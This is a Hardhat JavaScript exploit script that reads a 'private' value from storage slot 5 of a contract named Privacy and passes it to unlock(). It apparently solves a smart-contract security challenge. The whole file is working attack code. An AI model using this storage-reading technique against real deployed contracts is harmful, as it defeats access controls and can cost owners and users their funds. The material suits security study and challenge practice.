const { ethers } = require("hardhat")
const hre = require("hardhat")

const contractAddress = "0x3E49e7D9bAd2F83deE9003927ca21ef4e47D27e5"

async function privacyHack() {
    // Get the hex stored in slot 0x5
    const targetSlot = await ethers.provider.getStorageAt(contractAddress, "0x5")

    // Slice the value to get 16 bytes
    const key = targetSlot.slice(0, 34)

    console.log(`Computed key using ethers.js: ${key}`)

    // Check if data legth is 16 bytes
    const keyLengthBytes = ethers.utils.hexDataLength(key)
    console.log(`Length of the computed key in bytes: ${keyLengthBytes}`)

    // Get the contract instance
    const privacy = await hre.ethers.getContractAt("Privacy", contractAddress)
    console.log(`Locked? ${await privacy.locked()}`)

    // Hack
    console.log("Hacking...")
    await privacy.unlock(key)

    console.log(`Locked? ${await privacy.locked()}`)
}

privacyHack().catch((error) => {
    console.error(error)
    process.exitCode = 1
})
